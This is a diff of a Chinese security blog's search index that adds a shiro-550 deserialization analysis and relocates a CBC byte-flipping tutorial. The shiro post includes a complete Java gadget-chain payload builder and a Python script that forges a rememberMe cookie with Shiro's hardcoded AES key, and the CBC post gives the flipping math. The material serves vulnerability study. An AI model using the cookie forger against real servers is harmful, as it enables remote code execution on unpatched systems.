@@ -117,6 +117,61 @@
       </categories>
   </entry>
   <entry>
+    <title>CBC字节翻转攻击</title>
+    <url>/2020/05/08/cbc-reverse/</url>
+    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
+<a id="more"></a>
+
+<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
+<p><img src="1.png" alt=""></p>
+<p>文字版的加密过程：</p>
+<ol>
+<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
+<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
+<li>将IV和第一组明文异或。</li>
+<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
+<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
+<li>重复4-5,直到最后一组明文。</li>
+<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
+</ol>
+<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
+<p><img src="2.png" alt=""></p>
+<p>文字版的解密过程：</p>
+<ol>
+<li>从密文中提取出IV，然后将密文分组。</li>
+<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
+<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
+<li>重复3，直到最后一组密文。</li>
+</ol>
+<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
+<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
+<p><img src="3.png" alt=""></p>
+<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
+<p>此攻击造成的影响:</p>
+<ol>
+<li>绕过过滤器</li>
+<li>改变用户权限提升至管理员</li>
+<li>…</li>
+</ol>
+<p><strong>CBC翻转攻击过程</strong></p>
+<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
+
+<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
+
+<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
+<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
+<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>密码攻击</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Apache Commons Collections分析</title>
     <url>/2020/04/20/common-collections/</url>
     <content><![CDATA[<h1 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h1><p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。</p>
@@ -256,6 +311,89 @@
 ]]></content>
       <categories>
         <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>shiro-550反序列化漏洞分析复现</title>
+    <url>/2020/05/08/shrio-550-attack/</url>
+    <content><![CDATA[<p>Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。</p>
+<a id="more"></a>
+
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>&lt;= 1.2.4</li>
+</ul>
+<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>RememberMe</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro默认的设置暴露了web应用的反序列化攻击。特别是考虑到最近使用的<font color=#008000>commons-collections</font>的利用。  </p>
+<p>默认情况下，Apache Shiro框架使用<font color=#008000>CookieRememberMeManager</font>。它序列化、加密以及编码用户identity，以便之后的检索。因此，当它接收到来自未认证用户的请求时，它会寻找它们记住的identity，通过以下步骤:</p>
+<ul>
+<li>检索rememberMe cookie的值</li>
+<li>Base64解码</li>
+<li>使用AES解密</li>
+<li>反序列化(ObjectInputStream)</li>
+</ul>
+<p>然而，默认加密的key是硬编码的，意味着任何可以获得源代码的人都知道默认加密密钥的值。因此，攻击者可以创建一个恶意的对象，序列化(在调用序列化时未进行任何的过滤)、编码，然后将其作为cookie发送。Shiro将解码并反序列化它，意味着现在恶意的对象已经存活在服务器上了。</p>
+<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="cookie生成过程"><a href="#cookie生成过程" class="headerlink" title="cookie生成过程"></a>cookie生成过程</h2><p>对于利用方式的分析，首先跟进一下Cookie的生成存储过程。Shiro框架的特征是登录页面的cookie中存在rememberMe的内容值。在登录时勾选上remmemberMe框。</p>
+<p>首先在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>处下断点。</p>
+<p><img src="1.png" alt=""></p>
+<p>首先会进入<code>forgetIndentity</code>，在这个函数里将在response添加一些cookie信息。接着，由于设置了<code>token.setRememberMe(true)</code>。将会进入<code>rememberIdentity(subject,token,info)</code>。</p>
+<p><img src="2.png" alt=""></p>
+<p>首先获得info的principals，然后进入<code>rememberIndentity(subject,principals)</code>。跟进它</p>
+<p><img src="3.png" alt=""></p>
+<p>首先调用convertPrincipalsToBytes, 跟进它。它首先会序列化principals，然后，会用CBC模式进行分组加密。</p>
+<p><img src="4.png" alt=""></p>
+<p>然后调用<code>rememberSerializedIdentity</code>函数。跟进这个函数，可以看到它首先将序列化加密后的principals进行base64加密，然后存入cookie中。整个过程和我们了解到的一样，先<font color=#008000>序列化</font>，然后进行<font color=#008000>AES加密</font>，最后进行<font color=#008000>Base64加密</font>。</p>
+<h2 id="cookie的反序列化过程"><a href="#cookie的反序列化过程" class="headerlink" title="cookie的反序列化过程"></a>cookie的反序列化过程</h2><p>首先来看看整个的调用链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DefaultSecurityManager.createSubject()</span><br><span class="line">  -&gt;DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">    -&gt;DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">      -&gt;AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">        -&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面了解到了cookie生成的整个过程，接下来看看它的反序列化过程。选择了在<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code>这个位置下断点。其调用链如下所示</p>
+<p><img src="5.png" alt=""></p>
+<p>因为是从<code>SecurityManager</code>开始，然后开始进行相关的身份校验。往上走一步，定位到<code>getRememberedPrincipals</code>函数。</p>
+<p><img src="6.png" alt=""></p>
+<p>它首先会调用getRememberedSerializedIdentity函数，跟进它。</p>
+<p><img src="7.png" alt=""></p>
+<p>它会获取到http请求中的cookie值，然后将其进行base64解码并返回解码后的值。</p>
+<p>然后跟进<code>convertBytesToPrincipals</code>函数。</p>
+<p><img src="8.png" alt=""></p>
+<p>它会先将其进行解密然后进行反序列化。首先decrypt函数会讲其进行解密。然后调用<code>deserialize</code>函数来处理解密后的内容。</p>
+<p><img src="9.png" alt=""></p>
+<p>跟进它。</p>
+<p><img src="10.png" alt=""></p>
+<p>继续跟进<code>this.getSerializer().deserialize</code>函数</p>
+<p><img src="11.png" alt=""></p>
+<p>这里进入到了DefaultSerializer.deserialize函数，这个函数里看到了熟悉的readObject函数。</p>
+<p><img src="12.png" alt=""></p>
+<p>到这里整个反序列化过程的分析就结束了。接下来看看如何利用吧！</p>
+<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>在大多数直接利用的版本中，发现shiro自带的commons-collections的版本是3.2.1，从前面针对commons-collections的<a href="https://ananaskr.github.io/2020/04/29/ysoserial-cc-sumary/" target="_blank" rel="noopener">总结</a>可以知道，CommonsCollections1，3，5，6，7，9，10都可以利用。  </p>
+<p>然而在实际利用时，会发现无法直接利用shiro自带的commons-collections:3.2.1。从@orange和@zsx文章中，可以得知。<font color=#008000>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，ClassLoader.loadClass不支持装载数组类型的class</font>。</p>
+<p>让我们来分析分析这一过程。在前面分析到deserialize函数时，会发现</p>
+<p><img src="13.png" alt=""></p>
+<p>在第49行使用的是<code>ClassResolvingObjectInputStream</code>而不是传统的<code>ObjectInputStream</code>。跟进它，</p>
+<p><img src="14.png" alt=""></p>
+<p>可以看到它重写了ObjectInputStream的resolveClass函数。与下面这个传统的resolveClass相比，它使用的是<code>ClassUtils.forName()</code>。</p>
+<p><img src="15.png" alt=""></p>
+<p>跟进<code>ClassUtils.forName()</code>函数。</p>
+<p><img src="16.png" alt=""></p>
+<p>可以看到，它使用的是线程上下文加载器，它获取到的当前加载器是<code>ParallelWebappClassLoader</code>，其loadClass方法是继承自父类<code>WebappClassLoader</code>。会按照以下方式进行加载。</p>
+<p><img src="17.png" alt=""></p>
+<p>根据流程，<code>ParallelWebappClassLoader</code>会先寻找内部缓存，若找不到则交给URLClassLoader。在对于path为<code>/Lorg/apache/commons/collections/Transformer;.class</code>的情况下，是找不到的。所以，导致ClassNotFound。</p>
+<p>因此，在利用链中不能包含数组，即在之前分析的命令执行点，不能使用ChainedTransformer这个类。因为这个类的成员变量是一个数组。而之前分析的CommonsCollections利用链中，有提到利用InvokerTransformer的transform方法来调用newTransformer。之前的介绍中有利用LazyMap.get()来触发transform。<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">wh1t3p1g</a>也介绍了这种方式，结合了CommonsCollections5，6，9利用链，所以在这里就不再赘述了。直接来看看整个利用链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>完整的demo如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(innermap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,templates);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">        array = (Object[]) f2.get(innimpl);</span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line">        </span><br><span class="line">        Field field0 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将其产生的序列化后的数据，放入脚本中，生成cookie即可。脚本内容如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,<span class="string">'ysoserial.jar'</span>,<span class="string">'CommonsCollections5'</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s +((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">	key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">	mode = AES.MODE_CBC</span><br><span class="line">	iv = uuid.uuid4().bytes</span><br><span class="line">	encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">	file_body = pad(popen.stdout.read())</span><br><span class="line">	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">	<span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	command = <span class="string">"open /Applications/Calculator.app"</span></span><br><span class="line">	payload = encode_rememberme(command)</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"/Users/xxx/Desktop/payload.cookie"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">		print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()),file=fpw)</span><br></pre></td></tr></table></figure>
+
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方修复的方式是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该问题。然而，一些开源系统会使用固定的编码，通过搜索引擎、github来收集密钥，或许可以对该漏洞进行成功利用。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">Java反序列化利用链分析之Shiro反序列化</a></li>
+<li><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">Shiro-反序列化记录</a></li>
+<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
       </categories>
   </entry>
   <entry>
@@ -891,61 +1029,6 @@
 ]]></content>
       <categories>
         <category>JAVA安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CBC字节翻转攻击</title>
-    <url>/2020/05/08/cbc-reverse/</url>
-    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
-<a id="more"></a>
-
-<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
-<p><img src="1.png" alt=""></p>
-<p>文字版的加密过程：</p>
-<ol>
-<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
-<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
-<li>将IV和第一组明文异或。</li>
-<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
-<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
-<li>重复4-5,直到最后一组明文。</li>
-<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
-</ol>
-<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
-<p><img src="2.png" alt=""></p>
-<p>文字版的解密过程：</p>
-<ol>
-<li>从密文中提取出IV，然后将密文分组。</li>
-<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
-<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
-<li>重复3，直到最后一组密文。</li>
-</ol>
-<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
-<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
-<p><img src="3.png" alt=""></p>
-<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
-<p>此攻击造成的影响:</p>
-<ol>
-<li>绕过过滤器</li>
-<li>改变用户权限提升至管理员</li>
-<li>…</li>
-</ol>
-<p><strong>CBC翻转攻击过程</strong></p>
-<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
-
-<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
-
-<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
-<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
-<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>密码攻击</category>
       </categories>
   </entry>
 </search>
